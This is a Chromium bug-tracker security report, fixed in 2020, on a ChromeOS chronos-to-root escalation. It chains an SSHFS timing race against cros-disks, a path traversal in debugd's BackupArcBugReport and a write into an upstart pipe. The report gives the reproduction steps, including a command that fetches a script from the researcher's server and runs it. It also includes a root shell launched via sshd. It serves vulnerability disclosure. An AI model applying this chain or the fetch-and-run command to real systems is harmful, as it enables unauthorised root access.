# Security: ChromeOS chronos privilege escalation to root (cros-disks drivefs, BackupArcBugReport)

| Field | Value |
|-------|-------|
| **Issue ID** | [40053063](https://issues.chromium.org/issues/40053063) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Unknown |
| **Platforms** | ChromeOS |
| **Reporter** | ro...@rorym.cnamara.com |
| **Assignee** | mn...@chromium.org |
| **Created** | 2020-08-12 |
| **Bounty** | $30,000.00 |

## Description

**VULNERABILITY DETAILS**  

SSHFS mounts can be used as a timing and delay oracle which can allow an attacker to trick cros-disks to perform arbitrary file/directory chowns to chronos:chronos-access. A directory traversal in BackupArcBugReport can then be used to perform a root write to a hanging upstart script pipe to gain root command execution.

**VERSION**  

Google Chrome: 84.0.4147.110 (Official Build) (64-bit)  

Platform: 13099.85.0 (Official Build) stable-channel eve  

Google Pixelbook (eve)

**REPRODUCTION CASE**  

A patched version of OpenSSH, as well as a timing communication server (server.py) are both required to be running on a network accessible location. It should be possible to do this from termina but this was not incorporated for sake of simplicity.

The attached patch should be applied to openssh commit c593cc5e, and the built sftp-server should be configured with the running sshd, ie in sshd\_config:

Subsystem sftp /home/rory/cros/openssh/sftp-server -l DEBUG -f DAEMON

The provided tar.gz contains the expected directory structure as required by the exploit, and should be unpacked to $HOME on the ssh server. The location isn’t a requirement for exploitation but has been hardcoded in a few places.

The attached server.py script should also be running on the same host as the ssh server, in the sshfsrace directory (as provided).

It will be necessary to update the SSH\_ variables at the top of the script to reflect your environment, and the C2\_PORT variable is the port on which server.py runs, hardcoded in the python as 2222.

With sshd and server.py running, the attached script can be executed using:

sh <(cat run.sh)

For sake of ease, server.py also hosts the script at /run.sh, so execution can also be achieved with:

sh <(curl [server ip]:2222/run.sh)

DETAILS  

=== cros-disks drivefs chown ===  

When performing a drivefs mount, cros-disks drivefs\_helper does approximately the following steps (steps irrelevant to exploitation have been omitted)

1. Grab the datadir option from the options array, ensure that the provided directory exists, and then call realpath(3) on it [1]
2. Do the same for the myfiles option [2]
3. Validate the ownership permissions on datadir. If the owner is uid 304, change the directory group to chronos-access [3]
4. For each directory, recurse from step 3
5. For each file, chown it to chronos:chronos-access [4]

Using the uid option for SSHFS mounts, two SSHFS mounts are created, one for uid 304 and one for uid 1000. When mounted with specific uids, all files on the mount appear to be owned by that uid. The sftp server creates an out of band timing and delay mechanism that allows an exploit script to wait for a specific code path to be hit, and then signal to sftp-server that the code path should continue. This allows an attacker to delay cros-disks when it accesses the SSHFS mount, perform disk manipulations, then continue cros-disks.

The /dev/shm/realpath/datadir directory is created and passed in the cros-disks dbus drivefs mount call as the datadir option, with the myfiles option is passed as a path to the fuse mounted SSHFS as uid 1000 (/media/fuse/exploit1000/myfiles in the script).

The exploit script will then contact the server host and wait for cros-disks to perform a stat(2) on the myfiles directory. This is performed during step 2 above to ensure the directory’s existence. When the exploit script receives the signal that cros-disks is paused at this step it implies that realpath(3) has already been performed against the datadir parameter in step 1 above. While cros-disks is paused, /dev/shm/realpath/datadir is replaced with a symlink to /media/fuse/exploit304/dir, which is the SSHFS mount mounted as uid 304.

The exploit script will then signal to the server that sftp-server can continue it’s execution, returning the stat(2) response that cros-disks is waiting for. The exploit script will then wait for a chown against /media/fuse/exploit304/dir, as reported by the sftp-server and once again pause the server execution. This indicates that cros-disks has advanced to step 3 above.

While cros-disks hangs, the /dev/shm/realpath/datadir symlink is changed to point to /dev/shm/realpath/mydir. This directory is pre-prepared by the script to contain symlinks to files which are to-be-chowned. Directories to-be-chowned are inserted as empty files temporarily. A final symlink to the SSHFS mount is present in this directory which lexicographically sorts first in the directory listing, and is used as an oracle for step 5.

When the exploitation script signals to the sftp-server to continue, cros-disks will advance to step 4. There should be no directories present at this time, so cros-disks will advance to step 5.

Cros-disks creates a file listing to be acted on as part of the for loop. The first entry will be the oracle symlink to the SSHFS directory. The exploit script will wait on sftp-server here for cros-disks to chown this symlink (0racle). When flow reaches this step, the exploit script will then replace all dummy empty files in /dev/shm/realpath/mydir with symlinks to directories to-be-chowned. Since the FileEnumerator data remains in use these ex-file directory symlinks are still acted upon during the same for loop.

The exploit script allows sftp-server to continue and the result is arbitrary file and directory chowning to chronos:chronos-access (cros-disks has CAP\_CHOWN).

In summary, we create a datadir directory such that we still control the path after realpath(3) is called, we freeze cros-disks while myfiles is validated to replace the datadir with symlink to a directory owned by uid 304 on an SSHFS mount, we allow cros-disks to see that it is owned by 304 and begin to change the ownership recursively, we then freeze cros-disks again to swap the datadir symlink to a local directory (as symlinks are not allowed on SSHFS mounts), finally we freeze cros-disks a final time after it has created a list of files in this directory to chown, such that we can replace those files with symlinks to directories, as directories are treated differently.

It was found that freezing cros-disks by having it wait on sftp-server was a very reliable and tolerant technique, and no timeouts were noticed to make exploitation tricky, although very little time is needed whilst cros-disks is frozen in this case.

This vulnerability is exploited to chown the /dev/shm and /run directories and /run/containers/android-run\_oci/container.pid file.

[1] <https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/cros-disks/drivefs_helper.cc#156>  

[2] <https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/cros-disks/drivefs_helper.cc#169>  

[3] <https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/cros-disks/drivefs_helper.cc#76>  

[4] <https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/cros-disks/drivefs_helper.cc#89>

=== root file write target ===  

Similar to <https://crbug.com/chromium/1072253>, with different pause and write techniques.  

An upstart init pre-start script can be used as a target of a root file write, as the scripts are executed with sh via pipe file descriptors which remain open.

Cups\_proxy.conf is targeted here. Since we now own /run we can replace /run/cups\_proxy with a symlink to the sftp-server, and we can use the same technique as above to hang the upstart script when it attempts to chown this directory, which will dereference the symlink to the SSHFS share. [1]

This job can be started independently by chronos via dbus service activation. [2]

The exploit script will start the service via dbus and wait for it to be frozen in the call to chown. It can then identify the pid of the script and therefore the procfs path to the upstart pipe via initctl (or ps).

[1] <https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/cups_proxy/init/cups_proxy.conf#17>  

[2] <https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/cups_proxy/dbus/org.chromium.CupsProxyDaemon.service>

=== root file write ===  

debugd exposes the BackupArcBugReport function over dbus which nominally takes the user hash to perform an arc bug report. However, the hash is not validated or explicitly generated in this function and therefore a directory traversal can be utilized to cause debugd to write arc-bugreport.log to arbitrary paths on the filesystem. This occurs inside the debugd mount namespace, however /dev/shm is shared between the init and mount namespaces, so the exploitation script can create a symlink named arc-bugreport.log to further control the full path including filename (rather than just the directory). This can be used to point the bug report log to the proc filesystem, which is mounted rw in the debugd namespace.

Since chronos owns /dev/shm from earlier chown exploitation, the sticky bit can be turned off, which bypasses the protected\_symlink protection, which blocks cross user symlink dereferencing in a sticky directory. By disabling the sticky bit (chmod -t), debugd will dereference a chronos owned symlink at /dev/shm/arc-bugreport.log.

BackupArcBugReport uses android-sh to execute /system/bin/arc-bugreport, nominally in the arc namespace [1]. Android-sh derives the pid of the arc container for use with nsenter by reading the /run/containers/android-run\_oci/container.pid file. This file was chowned earlier in the exploit chain and is now writable by chronos. Therefore, chronos can then cause android-sh to be executed against an arbitrary attacker controlled namespace.

Note that since android-sh enters the user namespace of the target, and a user namespace is necessary to set up a fake chroot, this is not a direct privilege escalation. However, NoNewPrivs is not applied to this command execution so it is effectively a NoNewPrivs escape in this case, where an exploit script in this context would typically be running with NoNewPrivs enabled when not in dev mode. This is not used here.

Debugd takes the stdout of the executed process and writes it to the file (as directory traversed above), so full control is not desired at this stage.

A new mount namespace running sleep is created, with zcat bind mounted to /system/bin/runcon to bypass the noexec restrictions on custom binaries, which allows for control of the outputted data (but not full code execution control).

The desired output is then gzipped to /u:r:cros\_debugd\_minijail:s0.gz, with empty gzipped files placed at /system/bin/sh.gz and /system/bin/arc-bugreport.gz to stop errors (-c is also present as part of the command line but this is treated by zcat as a valid parameter, which does not affect the exploit). The full command executed by debugd via android-sh in the attacker controlled namespace will be: [2]

/system/bin/runcon u:r:cros\_debugd\_minijail:s0 /system/bin/sh -c /system/bin/arc-bugreport

Since runcon is now zcat, and zcat implicitly appends .gz to passed filenames, the resulting output is the decompressed contents of /u:r:cros\_debugd\_minijail:s0.gz, which in the case of the provided exploit script is ‘/usr/sbin/sshd -f /tmp/sshd\_config’.

Debugd will receive this output via stdout, and write it as root to the directory-traversed /dev/shm/arc-bugreport.log, which is a symlink to /proc/[pid of hanging cups\_proxy sh]/fd/10.

After a brief pause to ensure the exploit has completed, the exploit script instructs sftp-server to allow cups\_proxy to continue execution. The upstart script will read from it’s input pipe, now appended with attacker controlled data, and execute the provided commands as root.

The attached exploit script starts a local ssh server as root on port 1337, with root keys available at /tmp/ssh\_host\_rsa\_key. The chowned directories are re-chowned back to root and a poc shell is then provided.

[1] <https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/debugd/src/log_tool.cc#84>  

[2] <https://chromium.googlesource.com/chromiumos/platform2/+/refs/heads/master/arc/scripts/android-sh#80>

## Attachments

- [sshfsrace.tar.bz2](attachments/sshfsrace.tar.bz2) (application/octet-stream, 5.8 KB)
- [run.sh](attachments/run.sh) (text/plain, 7.8 KB)

## Timeline

### va...@chromium.org (2020-08-12)

[Empty comment from Monorail migration]

### va...@chromium.org (2020-08-12)

+cc: mnissler, the current CrOS security sheriff.

### mn...@chromium.org (2020-08-13)

chronos -> root priv esc, so high severity

breakdown and analysis underway

### mn...@chromium.org (2020-08-13)

[Empty comment from Monorail migration]

### mn...@chromium.org (2020-08-13)

Breaking this up into individual bugs:

1. cros-disks can be coerced by chronos to chown() arbitary file system objects to chronos:chronos-access: https://crbug.com/chromium/1115963
2. "root file write target" - nothing immediately vulnerable here in addition to #1. There's a hardening opportunity to prevent the open pipe FDs in uptart execution turning root file write into code execution though. I filed https://crbug.com/chromium/1115974 to track potential improvements of this.
3. BackupArcBugReport is missing parameter sanitization: https://crbug.com/chromium/1115977
4. The android-sh behavior is another instance due to a namespace switch into a malicious environment. My gut feeling is that we'd better harden this, but needs more thought. Filed https://crbug.com/chromium/1115987 for tracking purposes.

### ro...@rorym.cnamara.com (2020-08-13)

If I may, re 4, session_manager also stores the container pid after the container has been started (also by session_manager), and SessionManager dbus is allow own root only.
Exposing a dbus method for android-sh to get the pid would go some way to mitigating this, and would decrease the exposure to the short race between when run_oci writes container.pid and session_manager reads it, which could be helped by a pipefd passed to run_oci.

### [Deleted User] (2020-08-13)

Setting milestone and target because of Security_Impact=Stable and high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mn...@chromium.org (2020-08-14)

[Empty comment from Monorail migration]

### [Deleted User] (2020-08-14)

Setting Pri-1 to match security severity High. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-08-14)

[Empty comment from Monorail migration]

### [Deleted User] (2020-08-26)

[Empty comment from Monorail migration]

### mn...@chromium.org (2020-08-28)

All fixes have landed in the M85 branch, closing this.

### [Deleted User] (2020-08-28)

[Empty comment from Monorail migration]

### [Deleted User] (2020-08-28)

This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here, so you will need to investigate what - if anything - needs to be merged to M85. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here, so you will need to investigate what - if anything - needs to be merged to M85. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-08-28)

This bug requires manual review: Request affecting a post-stable build
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://chromium.googlesource.com/chromium/src.git/+/master/docs/process/merge_request.md#when-to-request-a-merge
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on master/ToT?
4. Why are these changes required in this milestone after branch?
5. Is this a new feature?
6. If it is a new feature, is it behind a flag using finch?

Please contact the milestone owner if you have questions.
Owners: benmason@(Android), bindusuvarna@(iOS), dgagnon@(ChromeOS), srinivassista@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ad...@google.com (2020-08-31)

[Empty comment from Monorail migration]

### ad...@google.com (2020-08-31)

Per https://crbug.com/chromium/1115662#c12 this is all merged to M85 already.

### ad...@google.com (2020-09-02)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### ad...@google.com (2020-09-02)

Congratulations! The VRP panel has decided to award $30,000 for this report.

### ro...@rorym.cnamara.com (2020-09-02)

Thank you!

### ad...@google.com (2020-09-03)

[Empty comment from Monorail migration]

### [Deleted User] (2020-12-04)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1115662?no_tracker_redirect=1

[Monorail blocked-on: crbug.com/chromium/1115963, crbug.com/chromium/1115977]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40053063)*
